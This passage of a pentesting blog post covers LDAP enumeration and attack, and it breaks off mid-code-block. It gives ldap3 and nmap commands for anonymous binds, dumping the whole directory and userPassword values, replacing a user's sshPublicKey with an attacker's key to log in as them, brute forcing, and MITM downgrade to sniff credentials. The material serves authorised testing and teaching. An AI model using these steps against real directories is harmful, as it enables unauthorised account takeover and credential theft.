<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="LDAP Pentesting Best Practices" /><meta property="og:locale" content="en" /><meta name="description" content="LDAP" /><meta property="og:description" content="LDAP" /><link rel="canonical" href="https://secybr.com/posts/ldap-pentesting-best-practices/" /><meta property="og:url" content="https://secybr.com/posts/ldap-pentesting-best-practices/" /><meta property="og:site_name" content="secybr penetration testing, red teaming and hack tricks." /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-15T00:00:00+03:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="LDAP Pentesting Best Practices" /><meta name="twitter:site" content="@0xhav0c" /><meta name="google-site-verification" content="405asbYxUs5N1iqL1zGg56yq-OlAtdexlSaC3FC7c9s" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-25T12:21:03+03:00","datePublished":"2022-06-15T00:00:00+03:00","description":"LDAP","headline":"LDAP Pentesting Best Practices","mainEntityOfPage":{"@type":"WebPage","@id":"https://secybr.com/posts/ldap-pentesting-best-practices/"},"url":"https://secybr.com/posts/ldap-pentesting-best-practices/"}</script><title>LDAP Pentesting Best Practices | secybr | penetration testing, red teaming and hack tricks.</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="secybr | penetration testing, red teaming and hack tricks."><meta name="application-name" content="secybr | penetration testing, red teaming and hack tricks."><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><meta content="secybr | penetration testing, red teaming and hack tricks." property="og:site_name"><meta content="LDAP Pentesting Best Practices" property="og:title"><meta content="article" property="og:type"><meta content="penetration testing, red teaming and hack tricks." property="og:description"><meta content="https://secybr.com/posts/ldap-pentesting-best-practices/" property="og:url"><meta content="2022-06-15T00:00:00+03:00" property="article:published_time"><meta content="https://secybr.com/about/" property="article:author"><meta content="https://secybr.com/assets/img/logo/logo.png" property="og:image"><meta content="pentesting protocols" property="article:section"><meta content="pentesting" property="article:tag"><meta content="ldap" property="article:tag"><meta content="best practicies" property="article:tag"><meta property="og:image" content="https://secybr.com/assets/img/logo/logo.png"><meta name="twitter:site" content="secybr"><meta name="twitter:creator" content="0xhav0c"><meta name="twitter:title" content="LDAP Pentesting Best Practices"><meta name="twitter:description" content="penetration testing, red teaming and hack tricks."><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://secybr.com/assets/img/logo/logo.png"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-6320091248407168" crossorigin="anonymous"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/logo/logo.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">secybr</a></div><div class="site-subtitle">is a product of 0xhav0c</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/whoami/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>WHO AM I?</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/0xhav0c" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/0xhav0c" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xhavocc','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>LDAP Pentesting Best Practices</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>LDAP Pentesting Best Practices</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1655240400" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 15, 2022 </em> </span> <span> Updated <em class="" data-ts="1656148863" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jun 25, 2022 </em> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/0xhav0c">0xhav0c</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1773 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><h1 id="ldap">LDAP</h1><blockquote class="prompt-tip"><div><p>LDAP usually uses ports 389,636,3268,3269</p></div></blockquote><h1 id="what-is-ldap">What is LDAP?</h1><p>Lightweight directory access protocol (LDAP) is a protocol that makes it possible for applications to query user information rapidly.</p><p>Companies store usernames, passwords, email addresses, printer connections, and other static data within directories. LDAP is an open, vendor-neutral application protocol for accessing and maintaining that data. LDAP can also tackle authentication, so users can sign on just once and access many different files on the server.</p><p>LDAP is a protocol, so it doesn’t specify how directory programs work. Instead, it’s a form of language that allows users to find the information they need very quickly.</p><p>LDAP is vender-neutral, so it can be used with a variety of different directory programs. Typically, a directory contains data that is:</p><ul><li><strong>Descriptive.</strong> Multiple points, such as name and location, come together to define an asset.<li><strong>Static.</strong> The information doesn’t change much, and when it does, the shifts are subtle.<li><strong>Valuable.</strong> Data stored within the directory is critical to core business functions, and it’s touched over and over again.</ul><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>PORT    STATE SERVICE REASON
389/tcp open  ldap    syn-ack
636/tcp open  LDAPS <span class="o">(</span>SSL<span class="o">)</span>
3269/tcp open LDAP Global Catalog
</pre></table></code></div></div><h2 id="the-ldap-process-explained"><span class="mr-2">The LDAP Process Explained</span><a href="#the-ldap-process-explained" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="/assets/img/pitcures/ldap/ldap.png" alt="Untitled" data-proofer-ignore></p><p>The average employee connects with LDAP dozens or even hundreds of times per day. That person may not even know the connection has happened even though the steps to complete a query are intricate and complex.</p><h3 id="an-ldap-query-typically-involves"><span class="mr-2">An LDAP query typically involves:</span><a href="#an-ldap-query-typically-involves" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><strong>Session connection.</strong> The user connects to the server via an LDAP port.<li><strong>Request.</strong> The user submits a query, such as an email lookup, to the server.<li><strong>Response.</strong> The LDAP protocol queries the directory, finds the information, and delivers it to the user.<li><strong>Completion.</strong> The user disconnects from the LDAP port.</ul><h3 id="before-any-search-commences-the-ldap-must-authenticate-the-user-two-methods-are-available-for-that-work"><span class="mr-2">Before any search commences, the LDAP must authenticate the user. Two methods are available for that work:</span><a href="#before-any-search-commences-the-ldap-must-authenticate-the-user-two-methods-are-available-for-that-work" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><strong>Simple.</strong> The correct name and password connect the user to the server.<li><strong>Simple Authentication and Security Layer (SASL).</strong> A secondary service, such as Kerberos, performs authentication before the user can connect. For companies that require advanced security, this can be a good option.</ul><p>Some queries originate within the company’s walls, but some start on mobile devices or home computers. Most LDAP communication is sent without scrambling or encryption, and that could cause security problems. Most companies use Transport Layer Security (TLS) to ensure the safety of LDAP messages.</p><h3 id="people-can-tackle-all-sorts-of-operations-with-ldap-they-can"><span class="mr-2">People can tackle all sorts of operations with LDAP. They can:</span><a href="#people-can-tackle-all-sorts-of-operations-with-ldap-they-can" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li><strong>Add.</strong> Enter a new file into the database.<li><strong>Delete.</strong> Take out a file from the database.<li><strong>Search.</strong> Start a query to find something within the database.<li><strong>Compare.</strong> Examine two files for similarities or differences.<li><strong>Modify.</strong> Make a change to an existing entry.</ul><h3 id="ldap-terms-to-understand"><span class="mr-2">LDAP Terms to Understand</span><a href="#ldap-terms-to-understand" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Common terms you’ll see as you begin to learn about LDAP include:</p><ul><li><strong>Data models.</strong> What types of information sit within your directory? Models help you understand the facets within your LDAP. You could have general information (such as an object class), names (how each item is uniquely referenced), functions (how the data is accessed), and security (how users move through authentication).<li><strong>Distinguished name (DN).</strong> This is a unique identifier of each entry that also describes location within the information tree.<li><strong>Modifications.</strong> These are requests LDAP users make to alter the data associated with an entry. Defined modification types include adding, deleting, replacing, and increasing.<li><strong>Relative distinguished name (RDN).</strong> This is a way of tying DNs together while specifying relative location.<li><strong>Schema.</strong> The coding that underpins your LDAP is known as schema. You’ll use this language to describe the format and attributes of each item that sits on the server.<li><strong>URLs.</strong> This is a string that includes the address and port of a server, along with other data that can define a group, provide a location, or refer an operation to another server.<li><strong>Uniform resource identifier (URI).</strong> This is a string of characters that defines a resource.</ul><h2 id="general-informations"><span class="mr-2">General Informations</span><a href="#general-informations" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="architecture-ldap-is-hierarchical"><span class="mr-2">Architecture (LDAP is hierarchical)</span><a href="#architecture-ldap-is-hierarchical" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><ul><li>DC = Domain Component, the domain name<li>OU = Organizational Unit, "folders<li>CN = Common Name, the name fiven to the objects (Username, Group name, Computer name, etc.)</ul><h3 id="interesting-attributes-for-user-class"><span class="mr-2">Interesting attributes for user class</span><a href="#interesting-attributes-for-user-class" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>ldapsearch “(objectClass=user)” interesting attributes:</p><ul><li>sAMAccountName<li>userPrincipalName<li>memberOf (groups)<li>badPwdCount (failed logins)<li>lastLogoff (timestamp)<li>lastLogon (timestamp)<li>pwdLastSet (timestamp)<li>logonCount</ul><h3 id="interesting-attributes-for-group-class"><span class="mr-2">Interesting attributes for group class</span><a href="#interesting-attributes-for-group-class" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>ldapsearch “(objectClass=group)” interesting attributes:</p><ul><li>cn<li>member (one per user/group)<li>memberOf (if nested in another group)</ul><h3 id="interesting-attributes-for-computer-class"><span class="mr-2">Interesting attributes for computer class</span><a href="#interesting-attributes-for-computer-class" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>ldapsearch “(objectClass=computer)” interesting attributes:</p><ul><li>name (NetBIOS name)<li>DNSHostName (FQDN) =&gt; combine it with DNS lookups and you can enumerate every IP address in the domain without scanning<li>operatingSystem<li>operatingSystemVersion (patch level)<li>lastLogonTimestamp<li>servicePrincipalName (running services =&gt; TERMSRV, HTTP, MSSQL)</ul><h1 id="ldap-pentesting">LDAP Pentesting</h1><div class="table-wrapper"><table><thead><tr><th><img data-src="https://www.shodan.io/static/img/favicon.png" alt="https://www.shodan.io/static/img/favicon.png" width="20px" data-proofer-ignore> Shodan search query :<tbody><tr><td><code class="language-plaintext highlighter-rouge">port:389,636,3268</code></table></div><h2 id="banner-grabbing"><span class="mr-2">Banner Grabbing</span><a href="#banner-grabbing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-sV</span> <span class="nt">-p389</span> 10.10.x.x
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/ldap/ldap1.png" alt="Untitled" data-proofer-ignore></p><h3 id="basic-enumeration"><span class="mr-2">Basic Enumeration</span><a href="#basic-enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>You can try to enumerate a LDAP with or without credentials using python: <code class="language-plaintext highlighter-rouge">pip3 install ldap3</code></p><p>First try to connect without credentials:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">ldap3</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="p">.</span><span class="n">Server</span><span class="p">(</span><span class="s">'10.10.x.x'</span><span class="p">,</span> <span class="n">get_info</span> <span class="o">=</span> <span class="n">ldap3</span><span class="p">.</span><span class="n">ALL</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span><span class="mi">636</span><span class="p">,</span> <span class="n">use_ssl</span> <span class="o">=</span> <span class="bp">True</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">ldap3</span><span class="p">.</span><span class="n">Connection</span><span class="p">(</span><span class="n">server</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">connection</span><span class="p">.</span><span class="n">bind</span><span class="p">()</span>
<span class="bp">True</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">server</span><span class="p">.</span><span class="n">info</span>
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/ldap/ldap2.png" alt="Untitled" data-proofer-ignore></p><p>If the response is True like in the previous example, you can obtain some interesting data of the LDAP (like the naming context or domain name) server from:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">server</span><span class="p">.</span><span class="n">info</span>
<span class="n">DSA</span> <span class="n">info</span> <span class="p">(</span><span class="k">from</span> <span class="n">DSE</span><span class="p">):</span>
<span class="n">Supported</span> <span class="n">LDAP</span> <span class="n">versions</span><span class="p">:</span> <span class="mi">3</span>
<span class="n">Naming</span> <span class="n">contexts</span><span class="p">:</span> 
<span class="n">dc</span><span class="o">=</span><span class="n">DOMAIN</span><span class="p">,</span><span class="n">dc</span><span class="o">=</span><span class="n">DOMAIN</span>
</pre></table></code></div></div><p>Once you have the naming context you can make some more exciting queries. This simply query should show you all the objects in the directory:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="n">connection</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">search_base</span><span class="o">=</span><span class="s">'DC=DOMAIN,DC=DOMAIN'</span><span class="p">,</span> <span class="n">search_filter</span><span class="o">=</span><span class="s">'(&amp;(objectClass=*))'</span><span class="p">,</span> <span class="n">search_scope</span><span class="o">=</span><span class="s">'SUBTREE'</span><span class="p">,</span> <span class="n">attributes</span><span class="o">=</span><span class="s">'*'</span><span class="p">)</span>
<span class="bp">True</span>
<span class="o">&gt;&gt;</span> <span class="n">connection</span><span class="p">.</span><span class="n">entries</span>
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/ldap/ldap3.png" alt="Untitled" data-proofer-ignore></p><p><img data-src="/assets/img/pitcures/ldap/ldap4.png" alt="Untitled" data-proofer-ignore></p><p>Or dump the whole ldap:</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;</span> <span class="n">connection</span><span class="p">.</span><span class="n">search</span><span class="p">(</span><span class="n">search_base</span><span class="o">=</span><span class="s">'DC=DOMAIN,DC=DOMAIN'</span><span class="p">,</span> <span class="n">search_filter</span><span class="o">=</span><span class="s">'(&amp;(objectClass=person))'</span><span class="p">,</span> <span class="n">search_scope</span><span class="o">=</span><span class="s">'SUBTREE'</span><span class="p">,</span> <span class="n">attributes</span><span class="o">=</span><span class="s">'userPassword'</span><span class="p">)</span>
<span class="bp">True</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">connection</span><span class="p">.</span><span class="n">entries</span>
</pre></table></code></div></div><p><img data-src="/assets/img/pitcures/ldap/ldap5.png" alt="Untitled" data-proofer-ignore></p><h3 id="information-collection-with-nmap-scripts"><span class="mr-2">Information Collection with Nmap Scripts</span><a href="#information-collection-with-nmap-scripts" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>nmap <span class="nt">-n</span> <span class="nt">-sV</span> <span class="nt">--script</span> <span class="s2">"ldap* and not brute"</span> 10.10.x.x <span class="c">#Using anonymous credentials</span>
nmap <span class="nt">-p</span> 389 <span class="nt">-sV</span> <span class="nt">-n</span> <span class="nt">--script</span> <span class="s2">"ldap* not brute"</span> <span class="nt">--script-args</span> <span class="s1">'ldap.username="cn=0xhav0c,cn=users,dc=secybr,dc=com",ldap.password=Password'</span> 10.10.x.x 
nmap <span class="nt">-p</span> 389 <span class="nt">--script</span> ldap-search <span class="nt">--script-args</span> <span class="s1">'ldap.username="cn=0xhav0c,cn=users,dc=secybr,dc=com",ldap.password=ldaptest,ldap.qfilter=custom,ldap.searchattrib="operatingSystem",ldap.searchvalue="Windows *Server*",ldap.attrib={operatingSystem,whencreated,OperatingSystemServicePack}'</span> 10.10.x.x 
</pre></table></code></div></div><blockquote class="prompt-tip"><div><p>You can use specific filters from <a href="https://nmap.org/nsedoc/scripts/ldap-search.html">here</a></p></div></blockquote><p><img data-src="/assets/img/pitcures/ldap/ldap6.png" alt="Untitled" data-proofer-ignore></p><h3 id="write-data"><span class="mr-2">Write data</span><a href="#write-data" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Note that if you can modify values you could be able to perform really interesting actions. For example, imagine that you can change the “sshPublicKey” information of your user or any user. It’s highly probable that if this attribute exist, then ssh is reading the public keys from LDAP. If you can modify the public key of a user you will be able to login as that user even if password authentication is not enabled in ssh.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;&gt;&gt;</span> <span class="kn">import</span> <span class="nn">ldap3</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="p">.</span><span class="n">Server</span><span class="p">(</span><span class="s">'x.x.x.x'</span><span class="p">,</span> <span class="n">port</span> <span class="o">=</span><span class="mi">636</span><span class="p">,</span> <span class="n">use_ssl</span> <span class="o">=</span> <span class="bp">True</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">connection</span> <span class="o">=</span> <span class="n">ldap3</span><span class="p">.</span><span class="n">Connection</span><span class="p">(</span><span class="n">server</span><span class="p">,</span> <span class="s">'uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'</span><span class="p">,</span> <span class="s">'PASSWORD'</span><span class="p">,</span> <span class="n">auto_bind</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">connection</span><span class="p">.</span><span class="n">bind</span><span class="p">()</span>
<span class="bp">True</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">connection</span><span class="p">.</span><span class="n">extend</span><span class="p">.</span><span class="n">standard</span><span class="p">.</span><span class="n">who_am_i</span><span class="p">()</span>
<span class="sa">u</span><span class="s">'dn:uid=USER,ou=USERS,dc=DOMAIN,dc=DOMAIN'</span>
<span class="o">&gt;&gt;&gt;</span> <span class="n">connection</span><span class="p">.</span><span class="n">modify</span><span class="p">(</span><span class="s">'uid=USER,ou=USERS,dc=DOMAIN=,dc=DOMAIN'</span><span class="p">,{</span><span class="s">'sshPublicKey'</span><span class="p">:</span> <span class="p">[(</span><span class="n">ldap3</span><span class="p">.</span><span class="n">MODIFY_REPLACE</span><span class="p">,</span> <span class="p">[</span><span class="s">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDHRMu2et/B5bUyHkSANn2um9/qtmgUTEYmV9cyK1buvrS+K2gEKiZF5pQGjXrT71aNi5VxQS7f+s3uCPzwUzlI2rJWFncueM1AJYaC00senG61PoOjpqlz/EUYUfj6EUVkkfGB3AUL8z9zd2Nnv1kKDBsVz91o/P2GQGaBX9PwlSTiR8OGLHkp2Gqq468QiYZ5txrHf/l356r3dy/oNgZs7OWMTx2Rr5ARoeW5fwgleGPy6CqDN8qxIWntqiL1Oo4ulbts8OxIU9cVsqDsJzPMVPlRgDQesnpdt4cErnZ+Ut5ArMjYXR2igRHLK7atZH/qE717oXoiII3UIvFln2Ivvd8BRCvgpo+98PwN8wwxqV7AWo0hrE6dqRI7NC4yYRMvf7H8MuZQD5yPh2cZIEwhpk7NaHW0YAmR/WpRl4LbT+o884MpvFxIdkN1y1z+35haavzF/TnQ5N898RcKwll7mrvkbnGrknn+IT/v3US19fPJWzl1/pTqmAnkPThJW/k= badguy@evil'</span><span class="p">])]})</span>
</pre></table></code></div></div><p>Example taken from: <a href="https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/">https://www.n00py.io/2020/02/exploiting-ldap-server-null-bind/</a></p><h2 id="credentials"><span class="mr-2">Credentials</span><a href="#credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><h3 id="plaintext-credentials"><span class="mr-2">Plaintext Credentials</span><a href="#plaintext-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If LDAP is used without SSL you can sniff credentials in plain text in the network.</p><p>Also, you can perform a MITM attack in the network between the LDAP server and the client. Here you can make a Downgrade Attack so the client with use the credentials in clear text to login.</p><p>If SSL is used you can try to make MITM like the mentioned above but offering a false certificate, if the user accepts it, you are able to Downgrade the authentication method and see the credentials again.</p><h3 id="valid-credentials"><span class="mr-2">Valid Credentials</span><a href="#valid-credentials" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If you have valid credentials to login into the LDAP server, you can dump all the information about the Domain Admin using:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>pip3 <span class="nb">install </span>ldapdomaindump 
ldapdomaindump <span class="nt">-u</span> secybr.com<span class="se">\0</span>xhav0c <span class="nt">-p</span> <span class="s1">'Password'</span> 10.10.x.x
</pre></table></code></div></div><h3 id="brute-forcing"><span class="mr-2">Brute Forcing</span><a href="#brute-forcing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">nmap</span> <span class="o">--</span><span class="n">script</span> <span class="n">ldap</span><span class="o">-</span><span class="n">brute</span> <span class="o">-</span><span class="n">p</span> <span class="mi">389</span> <span class="mf">10.10</span><span class="p">.</span><span class="n">x</span><span class="p">.</span><span class="n">x</span>
</pre></table></code></div></div><h3 id="check-null-credentials-or-if-your-credentials-are-valid"><span class="mr-2">Check NULL credentials or if your credentials are valid.</span><a href="#check-null-credentials-or-if-your-credentials-are-valid" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.x.x <span class="nt">-D</span> <span class="s1">''</span> <span class="nt">-w</span> <span class="s1">''</span> <span class="nt">-b</span> <span class="s2">"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"</span>
ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> 10.10.x.x <span class="nt">-D</span> <span class="s1">'secybr.com\0xhav0c'</span> <span class="nt">-w</span> <span class="s1">'Password'</span> <span class="nt">-b</span> <span class="s2">"DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;"</span>
<span class="c"># CREDENTIALS NOT VALID RESPONSE</span>
search: 2
result: 1 Operations error
text: 000004DC: LdapErr: DSID-0C090A4C, comment: In order to perform this operation a successful <span class="nb">bind </span>must be completed on the connection., data 0, v3839
